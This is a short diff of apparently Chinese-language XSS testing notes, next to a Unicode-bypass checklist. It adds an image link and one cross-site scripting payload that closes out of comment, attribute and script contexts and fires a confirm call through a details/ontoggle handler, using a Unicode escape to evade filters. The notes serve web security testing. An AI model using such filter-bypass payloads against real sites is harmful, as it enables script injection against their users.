@@ -31,6 +31,20 @@ unicode绕过checklist:
 
 https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html
 
+
+
+![EdH22_MXsAAYcKK](XSS.assets/EdH22_MXsAAYcKK.jpeg)
+
+```
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+```
+
+
+
+
+
+
+
 ## 挖掘XSS技巧
 
 ### 组件漏洞
